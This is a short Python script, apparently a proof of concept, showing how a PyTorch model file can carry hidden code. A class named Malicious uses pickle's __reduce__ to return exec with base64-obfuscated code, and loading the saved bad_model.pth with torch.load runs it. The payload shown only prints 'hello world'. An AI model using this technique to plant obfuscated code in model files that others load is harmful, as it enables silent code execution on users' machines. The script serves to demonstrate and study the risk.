import torch
import torch.nn as nn
import base64

# Step 1: Create and save a simple PyTorch model
def make_simple_model():
    # A simple linear model
    model = nn.Linear(2, 1)
    torch.save(model, "simple_model.pth")


# Step 2: Define a Malicious Class with an exec call, using base64 encoding
class Malicious:
    def __reduce__(self):
        # The malicious code, base64-encoded to obfuscate it
        encoded_code = base64.b64encode("""
print('hello world')
""".encode('utf-8')).decode('utf-8')

        # Return a method that decodes and executes the code
        return exec, (f"""
import base64 
exec(base64.b64decode('{encoded_code}').decode('utf-8'))
""",)


# Step 3: Load the original model, wrap it with the Malicious class, and save it as a new model
def make_bad_model():
    # Load the original model
    malicious_model = torch.load("simple_model.pth")

    # Add the malicious class to the end of the model
    malicious_model.end = Malicious()

    # Save the malicious model as a new file
    torch.save(malicious_model, "bad_model.pth")


# Step 4: Load both the original and malicious models to demonstrate behavior
def load_models():
    # Load the original (simple) model
    model = torch.load("simple_model.pth")
    print("Original Model:")
    print(model)

    # Load the malicious model (this will trigger the exec call)
    malicious_model = torch.load("bad_model.pth")
    print("Malicious Model:")
    print(malicious_model)


if __name__ == "__main__":
    # Step 1: Create a simple model if not already created
    make_simple_model()

    # Step 2: Create a malicious model
    make_bad_model()

    # Step 3: Load and print the models
    load_models()
